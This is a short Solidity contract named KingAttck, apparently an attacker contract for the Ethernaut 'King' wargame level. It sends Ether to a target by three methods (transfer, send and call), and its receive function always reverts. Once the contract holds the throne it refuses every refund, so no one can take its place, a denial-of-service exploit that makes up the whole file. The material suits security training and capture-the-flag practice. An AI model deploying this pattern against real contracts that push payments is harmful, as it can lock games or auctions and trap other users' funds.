pragma solidity ^0.8.0;

contract KingAttck {
    constructor() {}

    function takeKingshipOne(address payable _to) public payable {
        _to.transfer(msg.value);
    }

    function takeKingshipTwo(address payable _to) public payable {
        bool sent = _to.send(msg.value);
        require(sent, "Failed to send Ether");
    }

    function takeKingshipThree(address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        revert();
    }
}